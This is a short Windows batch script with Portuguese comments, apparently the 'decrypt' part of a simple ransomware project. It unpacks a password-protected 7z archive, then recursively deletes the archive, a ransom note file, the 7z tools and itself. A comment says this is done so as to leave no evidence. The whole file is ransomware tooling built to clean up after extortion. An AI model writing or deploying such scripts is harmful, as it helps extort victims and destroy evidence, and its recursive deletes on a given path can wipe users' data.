@echo off
setlocal enabledelayedexpansion

::Script batch para "descriptografar" um arquivo com senha
::Uso: ranson-decrypt [ARQUVO] [SENHA]
::Exemplo .\ranson-decrypt.bat .\arquivos\ 1234

:: variáveis
set caminho_arquivo=%1
set senha=%2

:: Executando comando para descriptografar
".\7z.exe" e -p%senha% %caminho_arquivo%

:: Apagando arquivos para não deixar evidencias
 del /s /q %caminho_arquivo%
 del /s /q "./resgate.txt"
 del /s /q 7z.exe
 del /s /q 7z.dll
 del /s /q ranson-decrypt.bat

:: Fechando script
exit /b 0